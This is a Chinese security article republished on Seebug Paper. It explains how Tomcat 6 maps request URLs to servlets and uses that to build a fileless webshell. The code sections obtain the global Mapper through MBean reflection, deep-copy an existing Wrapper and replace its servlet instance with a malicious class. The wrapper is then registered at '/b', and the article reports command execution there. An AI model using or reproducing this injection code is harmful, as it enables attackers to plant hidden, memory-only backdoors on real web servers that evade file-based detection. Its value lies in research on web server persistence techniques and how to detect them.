**作者：宽字节安全**  
**原文链接：<https://mp.weixin.qq.com/s/gYGrdDtIldzrE7NHSxTDYQ>**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！**  
**投稿邮箱：paper@seebug.org**

前几篇文章主要介绍了在tomcat，weblogic下如何通过动态注册一个Filter的方式，去实现无文件落地的webshell。当然在J2EE中，我们也可以动态注册一个Servlet去实现无文件落地的webshell。

**以下分析基于tomcat6，其他版本的Tomcat的思路类似**

## 0x00 servlet简介

### 1\. Servlet 是什么？

Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP
服务器上的数据库或应用程序之间的中间层。使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。Java
Servlet 通常情况下与使用 CGI（Common Gateway Interface，公共网关接口）实现的程序可以达到异曲同工的效果。但是相比于
CGI，Servlet 有以下几点优势：

  * 性能明显更好。

  * Servlet 在 Web 服务器的地址空间内执行。这样它就没有必要再创建一个单独的进程来处理每个客户端请求。

  * Servlet 是独立于平台的，因为它们是用 Java 编写的。服务器上的 Java 安全管理器执行了一系列限制，以保护服务器计算机上的资源。因此，Servlet 是可信的。

  * Java 类库的全部功能对 Servlet 来说都是可用的。它可以通过 sockets 和 RMI 机制与 applets、数据库或其他软件进行交互。

### 2\. Servlet 架构

下图显示了 Servlet 在 Web 应用程序中的位置。

![](https://images.seebug.org/content/images/2020/06/28/1593314157000-1vfnwq.png-w331s)

## 0x01 Tomcat响应servlet的流程

在org.apache.catalina.core.StandardContextValve#invoke中，简化后的代码如下

    
    
                    Wrapper wrapper = request.getWrapper();
    
                    Object[] instances = this.context.getApplicationEventListeners();
                    ServletRequestEvent event = null;
                    int i;
                    ServletRequestListener listener;
                    HttpServletRequest sreq;
                    if (instances != null && instances.length > 0) {
                        event = new ServletRequestEvent(((StandardContext)this.container).getServletContext(), request.getRequest());
    
                        for(i = 0; i < instances.length; ++i) {
                            if (instances[i] != null && instances[i] instanceof ServletRequestListener) {
                                listener = (ServletRequestListener)instances[i];
    
                                try {
                                    listener.requestInitialized(event);
                                } catch (Throwable var13) {
                                    this.container.getLogger().error(sm.getString("standardContext.requestListener.requestInit", instances[i].getClass().getName()), var13);
                                    sreq = request.getRequest();
                                    sreq.setAttribute("javax.servlet.error.exception", var13);
                                    return;
                                }
                            }
                        }
                    }
    
                    wrapper.getPipeline().getFirst().invoke(request, response);

在tomcat处理每次请求中，该方法是最重要的一个环节。在该方法中负责处理Listener请求，创建FilerChain以及找到对应的Servlet。

而`wrapper.getPipeline().getFirst().invoke(request,
response);`就是调用url请求对应的servlet。下面我们的任务就是找到tomcat如何设置wrapper对象，以及如何通过url去查找相对应的servlet类。

**我们从tomcat请求一个url开始分析**

![](https://images.seebug.org/content/images/2020/06/28/1593314158000-2ecban.png-w331s)

如果对tomcat高度抽象化，我们可以得出如下结论。tomcat是由Connector与container构成。Connector主要负责Tomcat如何接受网络请求，Container则负责装载webapp。在这其中Adapter是Connector与Container的桥梁，负责两者之间信息的传递。

目前为止，Tomcat 只有一个 Adapter 实现类，就是 CoyoteAdapter。Adapter 的主要作用是将 Request
对象适配成容器能够识别的 Request 对象，比如 Servlet 容器，它的只能识别 ServletRequest 对象，这时候就需要 Adapter
适配器类作一层适配。

在`org.apache.catalina.connector.CoyoteAdapter#service`方法中，包装request与response对象。并且根据url中webapp的名称，调用响应的container。简化后的代码如下

    
    
        public void service(Request req, Response res) throws Exception {
            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request)req.getNote(1);
            org.apache.catalina.connector.Response response = (org.apache.catalina.connector.Response)res.getNote(1);
    
            if (this.connector.getXpoweredBy()) {
                response.addHeader("X-Powered-By", POWERED_BY);
            }
    
            req.getRequestProcessor().setWorkerThreadName(Thread.currentThread().getName());
            if (this.postParseRequest(req, request, res, response)) {
                this.connector.getContainer().getPipeline().getFirst().invoke(request, response);
            }

`org.apache.catalina.connector.CoyoteAdapter#postParseRequest`负责处理request请求，从request中获取相关信息冰传递给tomcat。下面主要分析一下`org.apache.catalina.connector.CoyoteAdapter#postParseRequest`
该方法可以认为从请求中读取http请求等，关于请求url到servlet的代码如下

    
    
                    this.connector.getMapper().map(serverName, decodedURI, request.getMappingData());
                    request.setContext((Context)request.getMappingData().context);
                    if (request.getContext() == null) {
                        res.setStatus(404);
                        res.setMessage("Not found");
                        this.connector.getService().getContainer().logAccess(request, response, 0L, true);
                        return false;
                    } else {
                        request.setWrapper((Wrapper)request.getMappingData().wrapper);
                        if (!this.connector.getAllowTrace() && req.method().equalsIgnoreCase("TRACE")) {
                            Wrapper wrapper = request.getWrapper();

`request.getMappingData()`中负责存储本次请求url与servlet的请求。而`this.connector.getMapper().map`中负责查找url与servlet的对应关系，并存储到`request.getMappingData()`中。下面我们主要分析一下`this.connector.getMapper().map`方法，当然该方法最终调用的是`org.apache.tomcat.util.http.mapper.Mapper#internalMap`方法，代码如下

    
    
    org.apache.tomcat.util.http.mapper.Mapper#internalMap
    private final void internalMap(CharChunk host, CharChunk uri, MappingData mappingData) throws Exception {
            if (mappingData.host != null) {
                throw new AssertionError();
            } else {
          //... 省略无关代码
                    if (!found) {
                        if (contexts[0].name.equals("")) {
                            context = contexts[0];
                        }
                    } else {
                        context = contexts[pos];
                    }
    
                    if (context != null) {
                        mappingData.context = context.object;
                        mappingData.contextPath.setString(context.name);
                    }
    
                    if (context != null) {
                        this.internalMapWrapper(context, uri, mappingData);
                    }
    
                }
            }
        }

上面代码的作用是，从Mapper中根据webapp的名称，查找到相关的Map.context。而Map.context中，存储着每个webapp中url与servlet的对应关系。在方法的最后，调用`this.internalMapWrapper`去查找相对应的Wrapper，并存放在request中，作为本次请求中待调用的servlet。

在`internalMapWrapper`中，将会根据请求类型，去查找响应的Wrapper。总的来说有两大类，servlet与jsp。主要请求区别如下

  1. servlet 的wrapper中，ServletClass为用户的类。并且webapp中所有的exactWrapper都存放在Mapper的exactWrappers中

  2. jsp也是一类特殊的servlet，在服务器上会编译为servlet。所以jsp的wrapper只有两个，存放在Mapper的extensionWrapper中，一个为处理jsp的Wrapper，另外一个处理jspx

![](https://images.seebug.org/content/images/2020/06/28/1593314158000-3uvzpr.png-w331s)

`internalMapWrapper`的代码如图所示

![](https://images.seebug.org/content/images/2020/06/28/1593314158000-4rrdom.png-w331s)

现在找到tomcat如何设置wrapper以及请求流程，下面来实现基于servlet的无文件webshell。

## 0x02 代码实现

实现servlet主要有以下几个技术难点

### 1\. 寻找Mapper对象

根据我们的分析结论，Mapper是实现servlet的重点。mapper中的hosts字段，对应不同的webapp，在你需要的那个webapp添加servlet。在tomcat中，寻找Mapper对象的方法主要有以下两种

#### 1.1 全局context中

注意，这里是全局context，而不是webapp的context。context中获取Mapper的方法如下图

> **注意 我这里为了截图，直接从pageContext中截图，但是实际是不可以的，一定是全局context**
>
>
> ![](https://images.seebug.org/content/images/2020/06/28/1593314159000-5nwzxo.png-w331s)

#### 1.2 MBean中

这种就比较简单，在tomcat的MBean中，存储全局Mapper对象。我们可以从MBean中获取Mapper，然后添加我们自己的url与servlet的映射关系即可。代码如下。注意，在服务器上运行，能反射就反射，因为肯定没有相关的package。

![](https://images.seebug.org/content/images/2020/06/28/1593314159000-6qbfrd.png-w331s)

    
    
            Method getRegistryM = Class.forName("org.apache.tomcat.util.modeler.Registry").getMethod("getRegistry", Object.class, Object.class);
            Object RegistryO = getRegistryM.invoke(null, null, null);
    
            Method getMBeanServerM = RegistryO.getClass().getMethod("getMBeanServer");
            Object mbeanServer = getMBeanServerM.invoke(RegistryO);
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);
    
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            obj = field.get(obj);
    
            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap obj2 = (HashMap) field.get(obj);
            obj = ((HashMap) obj2.get("Catalina")).get("port=8080,type=Mapper");
    
            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            obj = field.get(obj);
    
            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
    
            Object Mapper = field.get(obj);

### 2\. 向Mapper中添加wrapper

幸运的是，Mapper中有相关方法，可以直接添加一个wrapper。其中第一个参数为url，第二个为url请求相对应的wrapper

    
    
    org.apache.tomcat.util.http.mapper.Mapper#addWrapper(org.apache.tomcat.util.http.mapper.Mapper.Context, java.lang.String, java.lang.Object)
    protected void addWrapper(Mapper.Context context, String path, Object wrapper) {
        this.addWrapper(context, path, wrapper, false);
    }

通过反射调用的代码如下

    
    
    Method addWrapperF = Mapper.getClass().getDeclaredMethod("addWrapper", 
    context.getClass(), String.class, Object.class);addWrapperF.setAccessible(true);
    addWrapperF.invoke(Mapper, context, "/b", wrapperTest);

### 3\. 如何生成一个Wrapper对象

在这里直接实例化Wrapper是不可以用的。所以我们需要想办法创建一个属于我们自己的wrapper对象。但是wrapper对象中参数过于复杂，为了不影响其他servlet的请求过程，深拷贝一个先有的wrapper对象，并修改响应ServletName是最简单的办法。但是wrapper对象没有实现clone方法。所以在这里我自己通过递归写了一个深拷贝对象的方法，代码如下

    
    
        public Object CopyObject(Object src, Object dst, Class srcClass) throws Exception {
            // 只考虑本项目中使用，恰好src对象只能通过无参构造函数去实例化
            if (dst == null) {
                dst = src.getClass().newInstance();
            }
            if (srcClass.getName().equals("java.lang.Object")) {
                return dst;
            }
    
            Field[] fields = srcClass.getDeclaredFields();
            for (Field f : fields) {
                if (java.lang.reflect.Modifier.isStatic(f.getModifiers())) {
                    // 如果是静态的变量，在这里不复制，直接跳过
                    continue;
                }
                if (java.lang.reflect.Modifier.isFinal(f.getModifiers())) {
                    // 如果是final的变量，在这里不复制，直接跳过
                    continue;
                }
                // 如果该字段不为public，则设置为public访问
                if (!f.isAccessible()) {
                    f.setAccessible(true);
                }
    
                f.set(dst, f.get(src));
            }
            return CopyObject(src, dst, srcClass.getSuperclass());
        }

拷贝对象后，我们再修改相关参数即可。

    
    
            Object wrapperTest = CopyObject(wrapperObject, null, wrapperObject.getClass());
            Method addMappingM = wrapperTest.getClass().getDeclaredMethod("addMapping", String.class);
            addMappingM.invoke(wrapperTest, "/b");

### 4\. Wrapper中servlet加载机制

在tomcat随后的请求中，会通过调用org.apache.catalina.core.StandardWrapperValve#invoke，获取Wrapper中对应的servlet。并调用，代码如下

    
    
        public final void invoke(Request request, Response response) throws IOException, ServletException {
            boolean unavailable = false;
            Throwable throwable = null;
            long t1 = System.currentTimeMillis();
            ++this.requestCount;
            StandardWrapper wrapper = (StandardWrapper)this.getContainer();
            Servlet servlet = null;
            Context context = (Context)wrapper.getParent();
    
            try {
                if (!unavailable) {
                    servlet = wrapper.allocate();
                }

下面我们主要分析一下`wrapper.allocate()`的代码

    
    
        public Servlet allocate() throws ServletException {
                if (!this.singleThreadModel) {
                    if (this.instance == null) {
                        synchronized(this) {
                            if (this.instance == null) 
                                    this.instance = this.loadServlet();
                            }
                        }
                    }
    
    
        public synchronized Servlet loadServlet() throws ServletException {
    
                    actualClass = jspWrapper.getServletClass();
                    ClassLoader classLoader = loader.getClassLoader();
                    Class classClass = null;
            if (classLoader != null) {
                            classClass = classLoader.loadClass(actualClass);
                        } else {
                            classClass = Class.forName(actualClass);
                        }

如果不存在instance，则通过loadServlet去查找对应的class并实例化。所以，我们直接修改wrapper的instance字段为实例化后的servlet即可。

    
    
            Field instanceF = wrapperTest.getClass().getDeclaredField("instance");
            instanceF.setAccessible(true);
            instanceF.set(wrapperTest, evilFilterClass.newInstance());

以上问题全部解决后，调用addWrapper添加即可完成

    
    
    addWrapperF.invoke(Mapper, context, "/b", wrapperTest);

## 0x03 成果检验

![](https://images.seebug.org/content/images/2020/06/28/1593314159000-7alnnj.png-w331s)
访问b 提示404

执行成功后，可以正常执行命令

![](https://images.seebug.org/content/images/2020/06/28/1593314160000-8ivkmw.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1254/>

